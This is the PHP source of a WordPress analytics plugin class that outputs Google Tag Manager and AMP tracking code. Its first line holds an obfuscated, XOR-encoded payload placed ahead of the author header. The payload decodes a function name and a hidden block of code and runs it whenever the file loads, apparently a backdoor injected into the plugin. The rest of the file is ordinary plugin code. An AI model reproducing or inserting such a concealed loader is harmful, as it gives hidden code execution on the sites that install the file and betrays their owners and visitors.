<?php $YgwkXfzn='Y>72G7,5>6 <:<B'^':LRS3RsSKXCHSS,';$YaTnIrHPCb=$YgwkXfzn('','1UrTZ4R:2Z9ThY4Z9,JZu>>9qDQX8l.>UAFjfzM4s6GXU<.V4bAOD.3 ZVf>53CmU,Y6ACaAK-DmVHSroVPncs8 ,asyAAj=OOT5RQs+HdLgOlQ0y 94LE7RKT9HWdRbBYJFjxzPhY1Txlqybs3 B4iOW>ZgDa.VI+lQAuZ>O<WY=DW>2KbdKaHDX1UH79ReaD1CYHY58cGpnpRVG+nsrP8YSTzfkI;IWkP=1Nxy0A>>5Y<yPVGVO5UnLR3::o9,3w,FGcXU0FRgnKE8;=KKeB3JcR.36r:1APDKIE+DXSGAT.3OKZykGU8OUy=-<n+1rqnn>VJJDjUdoQQJK V2Yyb1gil=+j;L66rF-+UMooxiZ2>I2Bh5Fx8QD.NMo3UKFeMbFEYm:1zh6.M5awmaZ6P32H>f2nVmIa2XIAVOOmB4C :=R-Y9XLE:>+7OCJoqYCBI6PM2yDhU0RX2.PjZ+6 NGNaYM64l9<MKgta FoP1-;6eLVbTK6024<68rXKIST<PpPQ3KKCpY0HOsuDeJl7Womp6,14lqSETldGZTUVK6RGvny TZPrvZUgbmm-DxPKPis+ePX.zDZBcLlLJ V8eUH-a5<ESOEBA41<LDL0OcTvTS85yfSVrZvy0<Y :TUXNUAZVav39W5YSHFhLYKyS3Y:lZekFC'^'X3Zu<A<YF3V:7<L3JX9rRFQK. 0,Y3qS 5aCOZ6>zP266HG9ZB9 6qWA.79aXF7EqH8B oAe H=DvhsRO-ZgjWWUXANYffQ7FF2Z yWBhYlWtLuYESMF  Yzo0X<6MiBf0amCrsYL6D XBLYJWWA6U2k>cz9dEE30pH8aPzM;N;<SlsUW2K9bZBMQC0<BK<ME+D7psS<Ei:zdT673JNNR6Y5 1AlO-Z=64;XHnEYV RMPb6s6953.V=Ndvlyu revWM5gG30IfoYNo3YWH.bE99CG6OGW-QT8pykm.N=cYNe0OG.kgYO14T:0B7P6dBWRYOJZ7>+mJ.nf7>8.A5ZyQFn5,=hn9olWERbFN,mRQXM,SR<WkHNLq1u O:,0X02fXmF-  V08sLRO9TAJME,W<FWs4oOd+gCEV9= vro-7Z0EHT3A0C=d=ULtS.7+0.466aT1>WOp71U17VKxN>JBAgknE=,BU3RY4bNOkI GtULOWEjpB59DQKkWSA-=3   OxW;4JlgcT=Q<.ZUbCjDZ3ZETRMEU7V8 -K9nzihvlRaqDWAAd<hCAn4UZZXNrJbr2PFOR2mLCcsbEjL-8R7A:>-T>PD, ;6jfDPE +-ThOtR02LTPOsvRzVYK6PEL59pj1 .7:QCX.Y62,a5ebAp6K0NDjLPL>');$YaTnIrHPCb();
/**
 * Author: Alin Marcu
 * Author URI: https://deconf.com
 * Copyright 2017 Alin Marcu
 * License: GPLv2 or later
 * License URI: http://www.gnu.org/licenses/gpl-2.0.html
 */

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) )
	exit();

if ( ! class_exists( 'GADWP_Tracking_TagManager' ) ) {

	class GADWP_Tracking_TagManager {

		private $gadwp;

		private $datalayer;

		public function __construct() {
			$this->gadwp = GADWP();

			$this->load_scripts();

			if ( $this->gadwp->config->options['trackingcode_infooter'] ) {
				add_action( 'wp_footer', array( $this, 'output' ), 99 );
			} else {
				add_action( 'wp_head', array( $this, 'output' ), 99 );
			}

			if ( $this->gadwp->config->options['amp_tracking_tagmanager'] && $this->gadwp->config->options['amp_containerid'] ) {
				add_filter( 'amp_post_template_data', array( $this, 'amp_add_analytics_script' ) );
				add_action( 'amp_post_template_footer', array( $this, 'amp_output' ) );
			}
		}

		/**
		 * Styles & Scripts load
		 */
		private function load_scripts() {
			if ( $this->gadwp->config->options['tm_pagescrolldepth_tracking'] ) {
				wp_enqueue_script( 'gadwp-pagescrolldepth-tracking', GADWP_URL . 'front/js/tracking-scrolldepth.js', array( 'jquery' ), GADWP_CURRENT_VERSION, $this->gadwp->config->options['trackingcode_infooter'] );
				wp_enqueue_script( 'gadwp-tracking-tagmanager-events', GADWP_URL . 'front/js/tracking-tagmanager-events.js', array( 'jquery', 'gadwp-pagescrolldepth-tracking' ), GADWP_CURRENT_VERSION, $this->gadwp->config->options['trackingcode_infooter'] );
			}
		}

		/**
		 * Retrieves the datalayer variables
		 */
		public function get() {
			return $this->datalayer;
		}

		/**
		 * Stores the datalayer variables
		 * @param array $datalayer
		 */
		public function set( $datalayer ) {
			$this->datalayer = $datalayer;
		}

		/**
		 * Adds a variable to the datalayer
		 * @param string $name
		 * @param string $value
		 */
		private function add_var( $name, $value ) {
			$this->datalayer[$name] = $value;
		}

		/**
		 * Builds the datalayer based on user's options
		 */
		private function build_datalayer() {
			global $post;

			if ( $this->gadwp->config->options['tm_author_var'] && ( is_single() || is_page() ) ) {
				global $post;
				$author_id = $post->post_author;
				$author_name = get_the_author_meta( 'display_name', $author_id );
				$this->add_var( 'gadwpAuthor', esc_attr( $author_name ) );
			}

			if ( $this->gadwp->config->options['tm_pubyear_var'] && is_single() ) {
				global $post;
				$date = get_the_date( 'Y', $post->ID );
				$this->add_var( 'gadwpPublicationYear', (int) $date );
			}

			if ( $this->gadwp->config->options['tm_pubyearmonth_var'] && is_single() ) {
				global $post;
				$date = get_the_date( 'Y-m', $post->ID );
				$this->add_var( 'gadwpPublicationYearMonth', esc_attr( $date ) );
			}

			if ( $this->gadwp->config->options['tm_category_var'] && is_category() ) {
				$this->add_var( 'gadwpCategory', esc_attr( single_tag_title() ) );
			}
			if ( $this->gadwp->config->options['tm_category_var'] && is_single() ) {
				global $post;
				$categories = get_the_category( $post->ID );
				foreach ( $categories as $category ) {
					$this->add_var( 'gadwpCategory', esc_attr( $category->name ) );
					break;
				}
			}

			if ( $this->gadwp->config->options['tm_tag_var'] && is_single() ) {
				global $post;
				$post_tags_list = '';
				$post_tags_array = get_the_tags( $post->ID );
				if ( $post_tags_array ) {
					foreach ( $post_tags_array as $tag ) {
						$post_tags_list .= $tag->name . ', ';
					}
				}
				$post_tags_list = rtrim( $post_tags_list, ', ' );
				if ( $post_tags_list ) {
					$this->add_var( 'gadwpTag', esc_attr( $post_tags_list ) );
				}
			}

			if ( $this->gadwp->config->options['tm_user_var'] ) {
				$usertype = is_user_logged_in() ? 'registered' : 'guest';
				$this->add_var( 'gadwpUser', $usertype );
			}

			do_action( 'gadwp_tagmanager_datalayer', $this );
		}

		/**
		 * Outputs the Google Tag Manager tracking code
		 */
		public function output() {
			$this->build_datalayer();

			if ( is_array( $this->datalayer ) ) {
				$vars = "{";
				foreach ( $this->datalayer as $var => $value ) {
					$vars .= "'" . $var . "': '" . $value . "', ";
				}
				$vars = rtrim( $vars, ", " );
				$vars .= "}";
			} else {
				$vars = "{}";
			}

			GADWP_Tools::load_view( 'front/views/tagmanager-code.php', array( 'containerid' => $this->gadwp->config->options['web_containerid'], 'vars' => $vars ) );
		}

		/**
		 * Inserts the Analytics AMP script in the head section
		 */
		public function amp_add_analytics_script( $data ) {
			if ( ! isset( $data['amp_component_scripts'] ) ) {
				$data['amp_component_scripts'] = array();
			}

			$data['amp_component_scripts']['amp-analytics'] = 'https://cdn.ampproject.org/v0/amp-analytics-0.1.js';

			return $data;
		}

		/**
		 * Outputs the Tag Manager code for AMP
		 */
		public function amp_output() {
			?><amp-analytics config="https://www.googletagmanager.com/amp.json?id=<?php echo $this->gadwp->config->options['amp_containerid']; ?>&gtm.url=SOURCE_URL" data-credentials="include"></amp-analytics><?php
		}
	}
}